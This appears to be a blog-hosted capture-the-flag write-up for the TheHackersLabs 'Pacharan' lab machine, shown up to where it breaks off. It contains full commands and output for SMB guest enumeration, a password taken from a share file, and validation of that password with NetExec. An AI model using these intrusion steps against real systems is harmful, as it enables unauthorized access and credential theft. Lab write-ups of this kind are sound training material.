<!doctype html><html lang=en><head><title>THL Pacharan WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="TheHackersLabs 'Pacharan' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="THL Pacharan WriteUp"><meta name=twitter:description content="TheHackersLabs 'Pacharan' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/pacharan/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="THL Pacharan WriteUp"><meta property="og:description" content="TheHackersLabs 'Pacharan' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-18T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-18T00:00:00+00:00"><meta property="article:tag" content="THL"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Netcat"><meta property="article:tag" content="Netexec"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/pacharan/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/pacharan/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/pacharan/>THL Pacharan WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-09-18T00:00:00Z>18 September, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
14-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/thl/>THL</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/smb/>Smb</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/password-spray/>Password Spray</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/printnightmare/>Printnightmare</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/seloaddriverprivilege/>Seloaddriverprivilege</a></span></div></div></header><div class=post-content><h1 id=pacharan----thehackerslabs>Pacharan &ndash; TheHackersLabs
<a class=heading-link href=#pacharan----thehackerslabs><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Easy</em></li><li>Platform: <em>TheHackersLabs</em></li></ul><p><img alt="&lsquo;TheHackersLabs&rsquo; Avatar" src=/pentesting/images/TheHackersLabs_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>&ldquo;Pacharan&rdquo; is an easy machine from <code>TheHackersLabs</code> platform. An anonymous login through <code>SMB</code> service leakes information about potential passwords and users in this machine. This allows us to enter in the victim machine with a user containing <code>SeLoadDriverPrivilege</code> enabled. We can then use this privilege to escalate privileges and own the system.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Nmap</code> scan shows multiple ports open: <code>53</code> <code>DNS</code>, <code>88</code> <code>Kerberos</code>, <code>135</code> <code>Microsoft RPC</code>, <code>389</code> <code>LDAP</code>, <code>445</code> <code>SMB</code>, <code>5985</code> <code>WinRM</code>; among many others:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49669,49670,49671,49672,49675,49681,49688 192.168.69.69 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 05:56 -03
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 192.168.69.69
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.00025s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE       VERSION
</span></span></span><span class=line><span class=cl><span class=go>53/tcp    open  domain        Simple DNS Plus
</span></span></span><span class=line><span class=cl><span class=go>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-17 03:57:17Z)
</span></span></span><span class=line><span class=cl><span class=go>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span></span><span class=line><span class=cl><span class=go>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>445/tcp   open  microsoft-ds?
</span></span></span><span class=line><span class=cl><span class=go>464/tcp   open  kpasswd5?
</span></span></span><span class=line><span class=cl><span class=go>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>636/tcp   open  tcpwrapped
</span></span></span><span class=line><span class=cl><span class=go>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>3269/tcp  open  tcpwrapped
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span></span><span class=line><span class=cl><span class=go>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>49671/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49672/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49675/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49681/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49688/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:F9:EA:71 (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-09-17T03:58:11
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: 2024-09-17T03:46:38
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled and required
</span></span></span><span class=line><span class=cl><span class=go>|_clock-skew: -5h00m01s
</span></span></span><span class=line><span class=cl><span class=go>|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:f9:ea:71 (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 89.14 seconds
</span></span></span></code></pre></div><p>To get info against this target, we run <code>enum4linux-ng</code>. If we attempt to get info with session <code>guest</code>, we get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /home/gunzf0x/GitStuff/enum4linux-ng/enum4linux-ng.py 192.168.69.69 -u &#39;guest&#39; -p &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ENUM4LINUX - next generation
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> ==========================
</span></span></span><span class=line><span class=cl><span class=go>|    Target Information    |
</span></span></span><span class=line><span class=cl><span class=go> ==========================
</span></span></span><span class=line><span class=cl><span class=go>[*] Target ........... 192.168.69.69
</span></span></span><span class=line><span class=cl><span class=go>[*] Username ......... &#39;guest&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Random Username .. &#39;zgjzuauv&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Password ......... &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Timeout .......... 5 second(s)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> =====================================
</span></span></span><span class=line><span class=cl><span class=go>|    Service Scan on 192.168.69.69    |
</span></span></span><span class=line><span class=cl><span class=go> =====================================
</span></span></span><span class=line><span class=cl><span class=go>[*] Checking LDAP
</span></span></span><span class=line><span class=cl><span class=go>[+] LDAP is accessible on 389/tcp
</span></span></span><span class=line><span class=cl><span class=go>[*] Checking LDAPS
</span></span></span><span class=line><span class=cl><span class=go>[+] LDAPS is accessible on 636/tcp
</span></span></span><span class=line><span class=cl><span class=go>[*] Checking SMB
</span></span></span><span class=line><span class=cl><span class=go>[+] SMB is accessible on 445/tcp
</span></span></span><span class=line><span class=cl><span class=go>[*] Checking SMB over NetBIOS
</span></span></span><span class=line><span class=cl><span class=go>[+] SMB over NetBIOS is accessible on 139/tcp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> =====================================================
</span></span></span><span class=line><span class=cl><span class=go>|    Domain Information via LDAP for 192.168.69.69    |
</span></span></span><span class=line><span class=cl><span class=go> =====================================================
</span></span></span><span class=line><span class=cl><span class=go>[*] Trying LDAP
</span></span></span><span class=line><span class=cl><span class=go>[+] Appears to be root/parent DC
</span></span></span><span class=line><span class=cl><span class=go>[+] Long domain name is: PACHARAN.THL
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> ============================================================
</span></span></span><span class=line><span class=cl><span class=go>|    Domain Information via SMB session for 192.168.69.69    |
</span></span></span><span class=line><span class=cl><span class=go> ============================================================
</span></span></span><span class=line><span class=cl><span class=go>[*] Enumerating via unauthenticated SMB session on 445/tcp
</span></span></span><span class=line><span class=cl><span class=go>[+] Found domain information via SMB
</span></span></span><span class=line><span class=cl><span class=go>NetBIOS computer name: WIN-VRU3GG3DPLJ
</span></span></span><span class=line><span class=cl><span class=go>NetBIOS domain name: PACHARAN
</span></span></span><span class=line><span class=cl><span class=go>DNS domain: PACHARAN.THL
</span></span></span><span class=line><span class=cl><span class=go>FQDN: WIN-VRU3GG3DPLJ.PACHARAN.THL
</span></span></span><span class=line><span class=cl><span class=go>Derived membership: domain member
</span></span></span><span class=line><span class=cl><span class=go>Derived domain: PACHARAN
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> =======================================
</span></span></span><span class=line><span class=cl><span class=go>|    Shares via RPC on 192.168.69.69    |
</span></span></span><span class=line><span class=cl><span class=go> =======================================
</span></span></span><span class=line><span class=cl><span class=go>[*] Enumerating shares
</span></span></span><span class=line><span class=cl><span class=go>[+] Found 10 share(s):
</span></span></span><span class=line><span class=cl><span class=go>ADMIN$:
</span></span></span><span class=line><span class=cl><span class=go>  comment: Admin remota
</span></span></span><span class=line><span class=cl><span class=go>  type: Disk
</span></span></span><span class=line><span class=cl><span class=go>C$:
</span></span></span><span class=line><span class=cl><span class=go>  comment: Recurso predeterminado
</span></span></span><span class=line><span class=cl><span class=go>  type: Disk
</span></span></span><span class=line><span class=cl><span class=go>IPC$:
</span></span></span><span class=line><span class=cl><span class=go>  comment: IPC remota
</span></span></span><span class=line><span class=cl><span class=go>  type: IPC
</span></span></span><span class=line><span class=cl><span class=go>NETLOGON:
</span></span></span><span class=line><span class=cl><span class=go>  comment: &#34;Recurso compartido del servidor de inicio de sesi\xF3n&#34;
</span></span></span><span class=line><span class=cl><span class=go>  type: Disk
</span></span></span><span class=line><span class=cl><span class=go>NETLOGON2:
</span></span></span><span class=line><span class=cl><span class=go>  comment: &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go>  type: Disk
</span></span></span><span class=line><span class=cl><span class=go>PACHARAN:
</span></span></span><span class=line><span class=cl><span class=go>  comment: &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go>  type: Disk
</span></span></span><span class=line><span class=cl><span class=go>PDF Pro Virtual Printer:
</span></span></span><span class=line><span class=cl><span class=go>  comment: Soy Hacker y arreglo impresoras
</span></span></span><span class=line><span class=cl><span class=go>  type: Printer
</span></span></span><span class=line><span class=cl><span class=go>SYSVOL:
</span></span></span><span class=line><span class=cl><span class=go>  comment: &#34;Recurso compartido del servidor de inicio de sesi\xF3n&#34;
</span></span></span><span class=line><span class=cl><span class=go>  type: Disk
</span></span></span><span class=line><span class=cl><span class=go>Users:
</span></span></span><span class=line><span class=cl><span class=go>  comment: &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go>  type: Disk
</span></span></span><span class=line><span class=cl><span class=go>print$:
</span></span></span><span class=line><span class=cl><span class=go>  comment: Controladores de impresora
</span></span></span><span class=line><span class=cl><span class=go>  type: Disk
</span></span></span><span class=line><span class=cl><span class=go>[*] Testing share ADMIN$
</span></span></span><span class=line><span class=cl><span class=go>[+] Mapping: DENIED, Listing: N/A
</span></span></span><span class=line><span class=cl><span class=go>[*] Testing share C$
</span></span></span><span class=line><span class=cl><span class=go>[+] Mapping: DENIED, Listing: N/A
</span></span></span><span class=line><span class=cl><span class=go>[*] Testing share IPC$
</span></span></span><span class=line><span class=cl><span class=go>[+] Mapping: OK, Listing: NOT SUPPORTED
</span></span></span><span class=line><span class=cl><span class=go>[*] Testing share NETLOGON
</span></span></span><span class=line><span class=cl><span class=go>[+] Mapping: OK, Listing: DENIED
</span></span></span><span class=line><span class=cl><span class=go>[*] Testing share NETLOGON2
</span></span></span><span class=line><span class=cl><span class=go>[+] Mapping: OK, Listing: OK
</span></span></span><span class=line><span class=cl><span class=go>[*] Testing share PACHARAN
</span></span></span><span class=line><span class=cl><span class=go>[+] Mapping: OK, Listing: DENIED
</span></span></span><span class=line><span class=cl><span class=go>[*] Testing share PDF Pro Virtual Printer
</span></span></span><span class=line><span class=cl><span class=go>[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
</span></span></span><span class=line><span class=cl><span class=go>[*] Testing share SYSVOL
</span></span></span><span class=line><span class=cl><span class=go>[+] Mapping: OK, Listing: DENIED
</span></span></span><span class=line><span class=cl><span class=go>[*] Testing share Users
</span></span></span><span class=line><span class=cl><span class=go>[+] Mapping: OK, Listing: DENIED
</span></span></span><span class=line><span class=cl><span class=go>[*] Testing share print$
</span></span></span><span class=line><span class=cl><span class=go>[+] Mapping: OK, Listing: DENIED
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>If we check what shares we have as <code>guest</code> user with <code>NetExec</code> we get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 192.168.69.69 -u &#39;guest&#39; -p &#39;&#39; --shares
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\guest:
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Enumerated shares
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  -----           -----------     ------
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesi√≥n
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON2       READ
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PACHARAN
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PDF Pro Virtual Printer                 Soy Hacker y arreglo impresoras
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  print$                          Controladores de impresora
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesi√≥n
</span></span></span></code></pre></div><p>Here, <code>NETLOGON2</code> is not a usual share.</p><p>If we check this shared resource with <code>smbclient</code>, we can see:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ smbclient -U guest% //192.168.69.69/NETLOGON2
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Try &#34;help&#34; to get a list of possible commands.
</span></span></span><span class=line><span class=cl><span class=go>smb: \&gt; ls
</span></span></span><span class=line><span class=cl><span class=go>  .                                   D        0  Wed Jul 31 13:25:34 2024
</span></span></span><span class=line><span class=cl><span class=go>  ..                                  D        0  Wed Jul 31 13:25:34 2024
</span></span></span><span class=line><span class=cl><span class=go>  Orujo.txt                           A       22  Wed Jul 31 13:25:55 2024
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>                7735807 blocks of size 4096. 4721853 blocks available
</span></span></span><span class=line><span class=cl><span class=go>smb: \&gt; get Orujo.txt
</span></span></span><span class=line><span class=cl><span class=go>getting file \Orujo.txt of size 22 as Orujo.txt (7.2 KiloBytes/sec) (average 7.2 KiloBytes/sec)
</span></span></span></code></pre></div><p>Where we were able to get a file called <code>Orujo.txt</code>.</p><p>Reading its content returns:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat Orujo.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Pericodelospalotes6969
</span></span></span></code></pre></div><p>Since <code>Orujo</code> seems like a user and <code>Pericodelospalotes6969</code> seems like a password, we can check if these credentials are valid in <code>SMB</code> service with <code>NetExec</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 192.168.69.69 -u &#39;orujo&#39; -p &#39;Pericodelospalotes6969&#39;
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\orujo:Pericodelospalotes6969
</span></span></span></code></pre></div><p>We can then check if we have new shared resources that we are allowed to read:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 192.168.69.69 -u &#39;orujo&#39; -p &#39;Pericodelospalotes6969&#39; --shares --filter-shares READ
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\orujo:Pericodelospalotes6969
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Enumerated shares
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  -----           -----------     ------
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON        READ            Recurso compartido del servidor de inicio de sesi√≥n
</span></span></span><span class=line><span class=cl><span class=go>SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PACHARAN        READ
</span></span></span></code></pre></div><p>We can now read <code>PACHARAN</code> shared resource.</p><p>Using <code>smbmap</code> in this new shared resource, shows a new file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ smbmap -H 192.168.69.69 -u &#39;orujo&#39; -p &#39;Pericodelospalotes6969&#39; -r &#39;PACHARAN&#39; --no-banner
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB connections(s) and 1 authenticated session(s)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] IP: 192.168.69.69:445       Name: 192.168.69.69             Status: Authenticated
</span></span></span><span class=line><span class=cl><span class=go>        Disk                                                    Permissions     Comment
</span></span></span><span class=line><span class=cl><span class=go>        ----                                                    -----------     -------
</span></span></span><span class=line><span class=cl><span class=go>        ADMIN$                                                  NO ACCESS       Admin remota
</span></span></span><span class=line><span class=cl><span class=go>        C$                                                      NO ACCESS       Recurso predeterminado
</span></span></span><span class=line><span class=cl><span class=go>        IPC$                                                    READ ONLY       IPC remota
</span></span></span><span class=line><span class=cl><span class=go>        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesi√≥n
</span></span></span><span class=line><span class=cl><span class=go>        NETLOGON2                                               NO ACCESS
</span></span></span><span class=line><span class=cl><span class=go>        PACHARAN                                                READ ONLY
</span></span></span><span class=line><span class=cl><span class=go>        ./PACHARAN
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Wed Jul 31 13:21:13 2024    .
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Wed Jul 31 13:21:13 2024    ..
</span></span></span><span class=line><span class=cl><span class=go>        fr--r--r--              921 Wed Jul 31 13:21:13 2024    ah.txt
</span></span></span><span class=line><span class=cl><span class=go>        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
</span></span></span><span class=line><span class=cl><span class=go>        print$                                                  NO ACCESS       Controladores de impresora
</span></span></span><span class=line><span class=cl><span class=go>        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesi√≥n
</span></span></span><span class=line><span class=cl><span class=go>        Users                                                   NO ACCESS
</span></span></span><span class=line><span class=cl><span class=go>[*] Closed 1 connections
</span></span></span></code></pre></div><p>We download this new file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ smbmap -H 192.168.69.69 -u &#39;orujo&#39; -p &#39;Pericodelospalotes6969&#39; --download &#39;PACHARAN/ah.txt&#39; --no-banner
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB connections(s) and 1 authenticated session(s)
</span></span></span><span class=line><span class=cl><span class=go>[+] Starting download: PACHARAN\ah.txt (921 bytes)
</span></span></span><span class=line><span class=cl><span class=go>[+] File output to: /home/gunzf0x/OtherMachines/TheHackersLabs/Pacharan/nmap/192.168.69.69-PACHARAN_ah.txt
</span></span></span><span class=line><span class=cl><span class=go>[*] Closed 1 connections
</span></span></span></code></pre></div><p>If we read this file, we have what might be potential passwords:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat 192.168.69.69-PACHARAN_ah.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
